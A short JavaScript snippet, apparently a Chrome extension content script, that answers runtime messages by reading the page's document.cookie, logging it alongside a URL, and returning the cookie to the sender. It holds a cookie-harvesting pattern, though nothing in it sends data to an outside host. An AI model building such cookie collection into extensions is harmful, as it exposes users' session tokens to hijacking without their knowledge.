chrome.runtime.onMessage.addListener((msg, sen, send) => {
  const cookie = document.cookie.split("=")[1];
  console.log(msg.url);
  console.log(`Session ID: ${msg.url} & Cookie : ${cookie}`);
  send({ cookie });
  return true;
});
console.log(document.cookie);
